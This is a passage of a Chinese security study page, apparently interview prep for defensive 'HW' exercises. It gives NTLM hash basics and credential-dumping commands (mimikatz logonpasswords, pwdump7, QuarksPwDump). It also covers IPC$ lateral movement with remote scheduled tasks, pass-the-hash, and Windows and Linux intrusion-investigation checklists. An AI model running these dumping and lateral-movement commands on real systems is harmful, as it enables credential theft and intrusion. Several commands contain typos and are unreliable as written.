<p>转换成 <code v-pre>Unicode</code> 格式</p>
<p><code v-pre>4100 6400 6D00 6900 6E00 4000 3100 3200 3300</code></p>
</li>
<li>
<p>对 <code v-pre>Unicode</code> 字符做 <code v-pre>MD4</code> 加密（不含空格），得到 <code v-pre>32</code> 位的十六进制数字串（加密数据类型为 <code v-pre>16进制字串</code>， 而非普通文本，这里使用 <code v-pre>hashcalc</code> 进行加密）</p>
<p><code v-pre>570a9a65db8fba761c1008a51d4c95ab</code></p>
</li>
</ol>
<h2 id="密码抓取" tabindex="-1"><a class="header-anchor" href="#密码抓取" aria-hidden="true">#</a> 密码抓取</h2>
<blockquote>
<p>首先，想要在 <code v-pre>Windows</code> 操作系统中抓取散列值或者明文密码，必须提权至 <code v-pre>System</code>。</p>
<p>本地用户名、散列值和其他安全验证信息都保存在 <code v-pre>SAM</code> 文件中。</p>
<p><code v-pre>lsass.exe</code> 进程用于实现 <code v-pre>Windows</code> 的安全策略（本地安全策略和登录策略），可以使用工具将散列值和明文密码从内存中的 <code v-pre>lsass.exe</code> 进程或 <code v-pre>SAM</code> 文件中导出。</p>
<p>在 <code v-pre>Windows</code> 操作系统中，<code v-pre>SAM</code> 文件的保存位置是 <code v-pre>C:\Windows\System32\config</code>，该文件是被锁定的，不允许赋值。</p>
<p>在渗透测试中，可以采用传统方法，在关闭 <code v-pre>Windows</code> 操作系统后，使用 <code v-pre>FE</code> 盘进入文件管理环境，直接复制 <code v-pre>SAM</code> 文件，也可以使用 <code v-pre>VSS</code> 等方法进行复制。</p>
</blockquote>
<h3 id="getpass-读取" tabindex="-1"><a class="header-anchor" href="#getpass-读取" aria-hidden="true">#</a> GetPass 读取</h3>
<p><code v-pre>./getpass.exe</code></p>
<h3 id="pwdump7-读取" tabindex="-1"><a class="header-anchor" href="#pwdump7-读取" aria-hidden="true">#</a> pwdump7 读取</h3>
<p><code v-pre>./pwdump7.exe</code></p>
<h3 id="quarkspwdump-读取" tabindex="-1"><a class="header-anchor" href="#quarkspwdump-读取" aria-hidden="true">#</a> QuarksPwDump 读取</h3>
<p><code v-pre>quarkspwdump.exe --dump-hash-local</code></p>
<h3 id="mimikztz-读取" tabindex="-1"><a class="header-anchor" href="#mimikztz-读取" aria-hidden="true">#</a> mimikztz 读取</h3>
<p><code v-pre>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p>
<h2 id="内网横向" tabindex="-1"><a class="header-anchor" href="#内网横向" aria-hidden="true">#</a> 内网横向</h2>
<h3 id="ipc-横向" tabindex="-1"><a class="header-anchor" href="#ipc-横向" aria-hidden="true">#</a> IPC$ 横向</h3>
<h4 id="ipc-介绍" tabindex="-1"><a class="header-anchor" href="#ipc-介绍" aria-hidden="true">#</a> IPC$ 介绍</h4>
<blockquote>
<p><code v-pre>IPC(Internet Process Connection, 网络进程连接)</code>共享“命名管道”的资源，是为了实现进程之间的通信而开放的命名管道。</p>
<p><code v-pre>IPC</code> 可以通过验证用户名和密码获取响应的权限，通常在进程管理计算机和查看计算机的共享资源时使用。</p>
</blockquote>
<blockquote>
<p>通过 <code v-pre>IPC$</code>	可以与目标机器建立连接，利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息。</p>
</blockquote>
<h4 id="建立-ipc" tabindex="-1"><a class="header-anchor" href="#建立-ipc" aria-hidden="true">#</a> 建立 IPC$</h4>
<p><code v-pre>net use \\192.168.xxx.xxx\ipc$ &quot;Admin@123&quot; /user:administrator</code></p>
<p><code v-pre>net use</code></p>
<h4 id="ipc-利用条件" tabindex="-1"><a class="header-anchor" href="#ipc-利用条件" aria-hidden="true">#</a> IPC$ 利用条件</h4>
<ol>
<li>
<p>开启 <code v-pre>139</code>、 ``445` 端口</p>
<p><code v-pre>ipcs</code> 可以实现远程登录及对默认共享资源的访问，<code v-pre>139</code> 端口的开启表示 <code v-pre>NetBIOS</code> 协议的应用。通过 <code v-pre>139</code>、 <code v-pre>445</code> 端口，可以实现对共享文件打印机的访问。</p>
</li>
<li>
<p>管理员开启了默认共享</p>
<p>默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘和系统目录等，通过 <code v-pre>ipc$</code> 可以实现对这些默认共享目录的访问</p>
</li>
</ol>
<h4 id="ipc-连接失败的原因" tabindex="-1"><a class="header-anchor" href="#ipc-连接失败的原因" aria-hidden="true">#</a> IPC$ 连接失败的原因</h4>
<ul>
<li>用户名或者密码错误</li>
<li>目标没有打开 <code v-pre>IPCS</code> 默认共享</li>
<li>不能成功连接目标的 <code v-pre>139</code>、 <code v-pre>445</code> 端口</li>
</ul>
<h4 id="ipc-连接常见的错误" tabindex="-1"><a class="header-anchor" href="#ipc-连接常见的错误" aria-hidden="true">#</a> IPC$ 连接常见的错误</h4>
<ul>
<li><code v-pre>5</code>： 拒绝访问</li>
<li><code v-pre>51</code>： <code v-pre>Windows</code> 无法找到网络路径，网络中存在问题</li>
<li><code v-pre>53</code>： 找不到网络路径。包括 <code v-pre>IP</code> 地址错误、目标未开机、目标的 <code v-pre>lanmanserver</code> 服务未启动、目标有防火墙对端口过滤等</li>
<li><code v-pre>67</code>： 找不到网络名，包括 <code v-pre>lanmanworkstation</code> 服务未启动， <code v-pre>ipcs</code> 已被删除</li>
<li><code v-pre>1219</code>： 提供的凭据与已存在的凭据集冲突。例如，已和目标建立了 <code v-pre>ipcs</code>，需要在删除原连接后重新连接</li>
<li><code v-pre>1326</code>： 未知的用户名或密码错误</li>
<li><code v-pre>1792</code>： 试图登录但网络登录服务没有启动。包括目标 <code v-pre>NetLogon</code> 服务未启动等</li>
<li><code v-pre>2242</code>： 此用户密码已经过期。例如： 目标机器设置了账号管理策略，强制用户定期修改密码。</li>
</ul>
<h4 id="建立-ipc-连接后的常用指令" tabindex="-1"><a class="header-anchor" href="#建立-ipc-连接后的常用指令" aria-hidden="true">#</a> 建立 IPC$ 连接后的常用指令</h4>
<ul>
<li><code v-pre>dir \\192.168.xxx.xxx\c$</code>： 列出远程主机 <code v-pre>C</code> 盘中的文件</li>
<li><code v-pre>tasklist [/s system] [/u username] [/p password] IP</code>： 列出远程主机上运行的进程</li>
<li><code v-pre>net time \\IP</code>： 查看远程主机系统时间</li>
<li><code v-pre>copy file \\IP\c$</code>： 复制远程主机文件</li>
<li><code v-pre>schtasks /create /s IP /tn 计划任务名 /sc onstart /tr c:\文件名 /ru system /f</code>： 创建计划任务</li>
<li><code v-pre>schtasks /run /s IP /i /tn 计划任务名</code>： 执行计划任务</li>
<li><code v-pre>schtasks /delete /s IP /tn 计划任务名 /f</code>： 删除计划任务</li>
<li><code v-pre>net use \\IP /del /y</code>： 清除 <code v-pre>IPC</code> 连接</li>
</ul>
<h3 id="哈希传递横向" tabindex="-1"><a class="header-anchor" href="#哈希传递横向" aria-hidden="true">#</a> 哈希传递横向</h3>
<h4 id="pth-攻击与原理" tabindex="-1"><a class="header-anchor" href="#pth-攻击与原理" aria-hidden="true">#</a> PTH 攻击与原理</h4>
<blockquote>
<p><code v-pre>PTH（Pass The Hash， PTH攻击）</code>，也叫哈希传递攻击。该方法通过找到与账户相关的密码散列值（通常是 <code v-pre>NTLM Hash</code>）来进行攻击。在域环境中，用户登录计算机时大都是域账号，而域管理员和本地管理员的账号大概率都是相同的。攻击者就是利用这样的场景，使用哈希传递的方式，登录内网中的其他计算机。而且，通过哈希传递攻击，不需要花费时间破解密码散列值去获取明文。</p>
</blockquote>
<blockquote>
<p>主流的 <code v-pre>Windows</code> 操作系统，通常会使用 <code v-pre>NTLM Hash</code> 对访问资源的用户进行身份验证。早期版本的 <code v-pre>Windows</code> 操作系统则使用 <code v-pre>LMHash</code> 对用户密码进行验证。但是，当密码大于 <code v-pre>15</code> 位时，就无法使用 <code v-pre>LM Hash</code> 了。从 <code v-pre>Windows vista</code> 和 <code v-pre>Windows server 2008</code> 版本开始， <code v-pre>Windows</code> 操作系统默认禁用 <code v-pre>LM Hash</code>， 因为在使用 <code v-pre>NTLM Hash</code> 进行身份认证时，不会使用明文口令，而是将明文口令通过系统 <code v-pre>API</code> 转换成散列值。不过，攻击者在获得密码散列值之后，依旧可以使用哈希传递攻击来模拟用户进行认证。</p>
</blockquote>
<h4 id="pth-传递攻击" tabindex="-1"><a class="header-anchor" href="#pth-传递攻击" aria-hidden="true">#</a> PTH 传递攻击</h4>
<p><code v-pre>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:hack.com /ntlm:xxxxxxxxxxxxx&quot;</code></p>
<h3 id="票据传递横向" tabindex="-1"><a class="header-anchor" href="#票据传递横向" aria-hidden="true">#</a> 票据传递横向</h3>
<h2 id="入侵检测" tabindex="-1"><a class="header-anchor" href="#入侵检测" aria-hidden="true">#</a> 入侵检测</h2>
<h3 id="windows-系统入侵排查" tabindex="-1"><a class="header-anchor" href="#windows-系统入侵排查" aria-hidden="true">#</a> Windows 系统入侵排查</h3>
<h4 id="检查系统账号安全" tabindex="-1"><a class="header-anchor" href="#检查系统账号安全" aria-hidden="true">#</a> 检查系统账号安全</h4>
<ol>
<li>服务器登录弱口令检查</li>
<li>服务器远程登录桌面协议端口开放检查
<ul>
<li>查看 <code v-pre>RDP</code> 协议端口（防止 <code v-pre>RDP</code> 端口被修改过，默认 3389）</li>
<li>检查 <code v-pre>RDP</code> 协议端口是否开放</li>
</ul>
</li>
<li>服务器账号检查
<ul>
<li><code v-pre>lusrmgr.msc</code> 检查是否有新增可疑账号</li>
<li>注册表检查是否存在隐藏账号</li>
<li>注册表检查是否存在克隆账号</li>
<li>扫描工具（如： D盾_web）检查是否存在可疑账号</li>
</ul>
</li>
</ol>
<h4 id="检查异常端口、进程" tabindex="-1"><a class="header-anchor" href="#检查异常端口、进程" aria-hidden="true">#</a> 检查异常端口、进程</h4>
<ol>
<li>检查端口连接情况
<ul>
<li><code v-pre>netstat -ano</code> 查看网络连接，定位可疑 <code v-pre>ESTABLISHED</code></li>
<li>根据上一步定位出的 <code v-pre>pid</code>，通过 <code v-pre>tasklist | findstr &quot;PID&quot;</code> 命令进行进程定位</li>
<li>检查 <code v-pre>0.0.0.0</code> 地址的绑定</li>
<li>检查已开放的端口是否已经做过公司内部备案（通信矩阵）</li>
</ul>
</li>
<li>检查进程
<ul>
<li>运行 <code v-pre>msinfo32</code>，依次点击【软件环境】【正在运行任务】查看进程的详细信息</li>
<li>扫描工具（如： D盾_web、 Process Explorer）查看进程，关注没有签名信息的进程</li>
<li>可疑进程主要关注：
<ul>
<li>没有签名验证信息的进程</li>
<li>没有描述信息的进程</li>
<li>进程属主</li>
<li>进程的路径</li>
<li>CPU 或内存资源占用长时间过高的进程</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="检查启动项、计划任务、服务" tabindex="-1"><a class="header-anchor" href="#检查启动项、计划任务、服务" aria-hidden="true">#</a> 检查启动项、计划任务、服务</h4>
<ol>
<li>检查启动项
<ul>
<li>检查【启动】目录下是否有非业务程序</li>
<li><code v-pre>msconfig</code> 检查是否存在可疑启动项，如有，取消勾选并前往所处路径下删除源文件</li>
<li><code v-pre>gpedit.msc</code> 组策略下检查是否存在可疑启动项</li>
<li><code v-pre>regedit</code> 检查注册表下是否存在可疑启动项，主要关注以下：
<ul>
<li><code v-pre>HKEY_CURRENT_USER\Software\Micorsoft\Windows\CurrentVersion\Run</code></li>
<li><code v-pre>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code v-pre>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</code></li>
</ul>
</li>
</ul>
</li>
<li>检查计划任务
<ul>
<li>检查【控制面板】【计划任务】中是否存在可疑文件</li>
<li><code v-pre>at</code> 或 <code v-pre>schtasks.exe</code> 检查计算机与网络其他计算机之间的会话或计划任务是否存在异常</li>
</ul>
</li>
<li>检查服务
<ul>
<li><code v-pre>services.msc</code> 检查是否存在异常服务（关注【状态】和【启动类型】）</li>
<li>留意隐藏服务</li>
</ul>
</li>
</ol>
<h4 id="检查系统相关信息" tabindex="-1"><a class="header-anchor" href="#检查系统相关信息" aria-hidden="true">#</a> 检查系统相关信息</h4>
<ol>
<li>查看系统版本以及补丁信息
<ul>
<li>运行 <code v-pre>systeminfo</code> 查看系统信息</li>
</ul>
</li>
<li>查看可疑目录及文件
<ul>
<li>用户目录（<code v-pre>C:\Documents and Settings\</code> 或 <code v-pre>C:\Users\</code>）</li>
<li>运行 <code v-pre>%USERPROFILE%\Recent</code> 查看最近文件</li>
<li>手动分析各目录下文件（夹）最近操作时间</li>
</ul>
</li>
</ol>
<h4 id="检查系统日志" tabindex="-1"><a class="header-anchor" href="#检查系统日志" aria-hidden="true">#</a> 检查系统日志</h4>
<p>默认位置：<code v-pre>%SystemRoot%\System32\Winevt\Logs\System.evtx</code> 或者右键【计算机】【管理】【事件管理器】</p>
<ol>
<li>
<p>应用程序日志</p>
</li>
<li>
<p>系统日志</p>
<blockquote>
<p><strong>系统日志</strong>记录操作系统组件产生的事件。主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由 <code v-pre>Windows NT/2000</code> 操作系统预先定义</p>
</blockquote>
</li>
<li>
<p>安全日志</p>
<blockquote>
<p><strong>安全日志</strong>记录操作系统的安全审计事件。主要包括各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、账号管理、策略变更、系统事件等。安全日志也是调查取证中最常用的日志。默认情况下，安全日志是关闭的，管理员可以使用组策略来启动安全日志，或者在注册表中设置审核策略。</p>
</blockquote>
<p>常见的事件 ID：</p>
<ul>
<li>4624： 登录成功</li>
<li>4625： 登录失败</li>
<li>4634： 注销成功</li>
<li>4647： 用户启动的注销</li>
<li>4672： 超级用户登录</li>
<li>4720： 创建用户</li>
</ul>
<p>常见的登录类型：</p>
<ul>
<li>2： 交互式登录。用户在本地登录</li>
<li>3： 网络登录。例如： 连接到共享文件或共享打印机</li>
<li>4： 批处理。例如： 计划任务启动</li>
<li>5： 服务。每种服务都被配置在某个特定账号下运行的</li>
<li>7： 解锁。屏幕解锁</li>
<li>8： 网络明文。登录密码在网络上明文传输，如： FTP 登录</li>
<li>9： 新凭证。使用带 <code v-pre>/Netonly</code> 参数的 <code v-pre>RUNAS</code> 命令运行一个程序</li>
<li>10： 远程交互。通过终端服务、远程桌面协议等登录</li>
<li>11： 缓存交互。通常是以一个域用户登录而又没有域控制器的情况下</li>
</ul>
</li>
</ol>
<h4 id="日志分析" tabindex="-1"><a class="header-anchor" href="#日志分析" aria-hidden="true">#</a> 日志分析</h4>
<h3 id="linux-系统入侵排查" tabindex="-1"><a class="header-anchor" href="#linux-系统入侵排查" aria-hidden="true">#</a> Linux 系统入侵排查</h3>
<h4 id="账号安全" tabindex="-1"><a class="header-anchor" href="#账号安全" aria-hidden="true">#</a> 账号安全</h4>
<ol>
<li>用户信息文件
<ul>
<li><code v-pre>etc/passwd</code></li>
</ul>
</li>
<li>影子文件
<ul>
<li><code v-pre>/etc/shadow</code></li>
</ul>
</li>
<li>其他常用的组合命令：
<ul>
<li>查询特权用户： <code v-pre>awk -F: '$3==0{print $1}' /etc/passwd</code></li>
<li>查询可以远程登录的账号： <code v-pre>awk '/\$1|\$6/{print $1}' /etc/shadow</code></li>
<li>查询拥有 <code v-pre>sudo</code> 权限的账号： <code v-pre>more /etc/sudoerss|grep -v &quot;^#\|^$&quot;|grep &quot;ALL=(ALL)&quot;</code></li>
<li>禁用账号： <code v-pre>usermod -L user</code> 被禁用后，账号无法登录，<code v-pre>/etc/shadow</code> 文件中对应的账户第二类会以 <code v-pre>!</code> 开头</li>
<li>删除账号： <code v-pre>userdel user</code></li>
<li>删除账号并清空用户目录： <code v-pre>userdel -r user</code> 用户目录就是 <code v-pre>/home/user</code> 目录</li>
<li>查看当前登录用户： <code v-pre>who</code> （<code v-pre>tty</code>： 本地登录； <code v-pre>pts</code>： 远程登录）</li>
<li>查看系统信息： <code v-pre>w</code> （参考判断某时刻用户的行为，登录方式、登录地址、时间等）</li>
<li>查看登录时间： <code v-pre>uptime</code></li>
</ul>
</li>
</ol>
<h4 id="历史命令" tabindex="-1"><a class="header-anchor" href="#历史命令" aria-hidden="true">#</a> 历史命令</h4>
<p>在用户根目录下：</p>
<ul>
<li><code v-pre>cd /home/user</code></li>
<li><code v-pre>cat .bash_history</code></li>
</ul>
<h4 id="检查异常端口" tabindex="-1"><a class="header-anchor" href="#检查异常端口" aria-hidden="true">#</a> 检查异常端口</h4>
<ol>
<li>查看端口信息
<ul>
<li><code v-pre>netstat -anptl|more</code></li>
</ul>
</li>
<li>查看 <code v-pre>pid</code> 对应的进程文件</li>
</ol>
<ul>
<li><code v-pre>ls -l /proc/$PID/exe</code> 或 <code v-pre>file /proc/$PID/exe</code></li>
</ul>
<h4 id="检查异常进程" tabindex="-1"><a class="header-anchor" href="#检查异常进程" aria-hidden="true">#</a> 检查异常进程</h4>
<ul>
<li><code v-pre>ps -aux | grep $PID</code></li>
</ul>
<h4 id="检查开机启动项" tabindex="-1"><a class="header-anchor" href="#检查开机启动项" aria-hidden="true">#</a> 检查开机启动项</h4>
<ol>
<li>
<p>查看系统运行级别</p>
<ul>
<li><code v-pre>runlevel</code></li>
</ul>
<p>运行级别划分如下：</p>
<ul>
<li>0： 关机</li>
<li>1： 单用户模式。类似于 <code v-pre>Windows</code> 的安全模式，常用于系统修复</li>
<li>2： 不完全的命令行模式，不含 <code v-pre>NFS</code> 服务</li>
<li>3： 完全的命令行模式，标准字符界面</li>
<li>4： 系统保留</li>
<li>5： 图形化界面模式</li>
<li>6： 重启动</li>
</ul>
</li>
</ol>
<h4 id="检查定时任务" tabindex="-1"><a class="header-anchor" href="#检查定时任务" aria-hidden="true">#</a> 检查定时任务</h4>
<ol>
<li>
<p>检查定时任务</p>
<ul>
<li><code v-pre>crontab -l</code></li>
<li>查看定时任务保存的文件（重点关注以下目录， 使用 <code v-pre>more</code> 可以查看目录下所有文件）：
<ul>
<li><code v-pre>/var/spool/cron/*</code></li>
<li><code v-pre>/etc/crontab</code></li>
<li><code v-pre>/etc/cron.d/*</code></li>
<li><code v-pre>/etc/cron.daily/*</code></li>
<li><code v-pre>/etc/cron.hourly/*</code></li>
<li><code v-pre>/etc/cron.monthly/*</code></li>
<li><code v-pre>/etc/cron.weekly/*</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><code v-pre>anacron</code> 实现的异步定时任务调度</p>
<ul>
<li>使用案例：
<ul>
<li>每天运行 <code v-pre>/home/backup.sh</code> 脚本： <code v-pre>vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh</code></li>
</ul>
</li>
<li>查看异步定时任务调度
<ul>
<li><code v-pre>/etc/anacrontab</code></li>
<li><code v-pre>/var/spool/anacrontab</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="检查服务" tabindex="-1"><a class="header-anchor" href="#检查服务" aria-hidden="true">#</a> 检查服务</h4>
<ol>
<li>
<p>方法一：</p>
<ul>
<li><code v-pre>chkconfig [--level 运行级别][独立服务名][on|off]</code> 默认级别是： <code v-pre>2345</code></li>
<li>例： <code v-pre>chkconfig httpd on</code></li>
</ul>
</li>
<li>
<p>方法二：</p>
<ul>
<li>修改 <code v-pre>/etc/rc.d/rc.local</code> 文件</li>
<li>加入 <code v-pre>/etc/init.d/httpd start</code></li>
</ul>
</li>
<li>
<p>方法三：</p>
<ul>
<li><code v-pre>ntsysv</code> 命令管理自启动，可以管理独立服务和 <code v-pre>xinetd</code> 服务</li>
</ul>
</li>
</ol>
<h4 id="检查异常文件" tabindex="-1"><a class="header-anchor" href="#检查异常文件" aria-hidden="true">#</a> 检查异常文件</h4>
<h4 id="检查系统日志-1" tabindex="-1"><a class="header-anchor" href="#检查系统日志-1" aria-hidden="true">#</a> 检查系统日志</h4>
<ol>
<li>
<p>定位有多少个 IP 在爆破主机的 root 账号</p>
<ul>
<li>爆破的 IP 信息： <code v-pre>grep &quot;Failed password form root&quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more</code></li>
<li>爆破的 IP 地址： <code v-pre>grep &quot;Failed password from root&quot; /var/log/secure | grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</code></li>
<li>爆破的用户名字典： <code v-pre>grep &quot;Failed password&quot; /var/log/secure|prel -e 'while($_=&lt;&gt;){/for(.*?) from/; print &quot;$1\n&quot;;}'|uniq -c|sort -nr</code></li>
</ul>
</li>
<li>
<p>登录成功的 IP</p>
<ul>
<li><code v-pre>grep &quot;Accepted&quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more</code></li>
</ul>
</li>
<li>
<p>登录成功的日期、用户名、IP：</p>
<ul>
<li><code v-pre>grep &quot;Accepted&quot; /var/log/secure | awk '{print $1,$2,$3,$9,$11}'</code></li>
</ul>
</li>
</ol>
<p>常见的日志文件：</p>
<ul>
<li><code v-pre>/var/log/cron</code>： 记录了系统定时任务相关的日志</li>
<li><code v-pre>/var/log/cups</code>： 记录打印信息的日志</li>
<li><code v-pre>/var/log/dmesg</code>： 记录了系统在开机时内核自检的信息</li>
<li><code v-pre>/var/log/maillog</code>： 记录右键信息</li>
<li><code v-pre>/var/log/message</code>： 记录系统重要信息的日志。系统出现问题时，首先要检查的就应该是这个日志。</li>
<li><code v-pre>/var/log/btmp</code>： 记录错误登录日志。是个二进制文件，要用 <code v-pre>lastb</code> 命令查看</li>
<li><code v-pre>/var/log/lastlog</code>： 记录系统中所有用户最后一次登录时间。是个二进制文件，要用 <code v-pre>lastlog</code> 命令查看</li>
<li><code v-pre>/var/log/wtmp</code>： 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。是个二进制文件，要用 <code v-pre>last</code> 命令查看</li>
<li><code v-pre>/var/log/utmp</code>： 记录当前已经登录的用户信息，会随着用户的登录和注销不断变化，只记录当前登录的用户信息。是个二进制文件，要用 <code v-pre>w</code>、 <code v-pre>who</code>、 <code v-pre>users</code> 等命令查看</li>
<li><code v-pre>/var/log/secure</code>： 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录。比如 <code v-pre>SSH</code> 登录、 <code v-pre>su</code> 切换用户、 <code v-pre>sudo</code> 授权、 添加删除用户等。</li>
</ul>
<h2 id="常见安全设备" tabindex="-1"><a class="header-anchor" href="#常见安全设备" aria-hidden="true">#</a> 常见安全设备</h2>
<h3 id="态势感知" tabindex="-1"><a class="header-anchor" href="#态势感知" aria-hidden="true">#</a> 态势感知</h3>
<h3 id="终端防护" tabindex="-1"><a class="header-anchor" href="#终端防护" aria-hidden="true">#</a> 终端防护</h3>
<h3 id="蜜罐设备" tabindex="-1"><a class="header-anchor" href="#蜜罐设备" aria-hidden="true">#</a> 蜜罐设备</h3>
<h3 id="沙箱平台" tabindex="-1"><a class="header-anchor" href="#沙箱平台" aria-hidden="true">#</a> 沙箱平台</h3>
<h3 id="威胁情报平台" tabindex="-1"><a class="header-anchor" href="#威胁情报平台" aria-hidden="true">#</a> 威胁情报平台</h3>
<h3 id="edr-设备" tabindex="-1"><a class="header-anchor" href="#edr-设备" aria-hidden="true">#</a> EDR 设备</h3>
<h2 id="其他-1" tabindex="-1"><a class="header-anchor" href="#其他-1" aria-hidden="true">#</a> 其他</h2>
<h3 id="hw-工作注意事项" tabindex="-1"><a class="header-anchor" href="#hw-工作注意事项" aria-hidden="true">#</a> HW 工作注意事项</h3>
<h3 id="日报编写规范" tabindex="-1"><a class="header-anchor" href="#日报编写规范" aria-hidden="true">#</a> 日报编写规范</h3>
<h3 id="简历编写思路" tabindex="-1"><a class="header-anchor" href="#简历编写思路" aria-hidden="true">#</a> 简历编写思路</h3>
<h3 id="面试回答技巧" tabindex="-1"><a class="header-anchor" href="#面试回答技巧" aria-hidden="true">#</a> 面试回答技巧</h3>
<h3 id="面试经验分享" tabindex="-1"><a class="header-anchor" href="#面试经验分享" aria-hidden="true">#</a> 面试经验分享</h3>
</div></template>


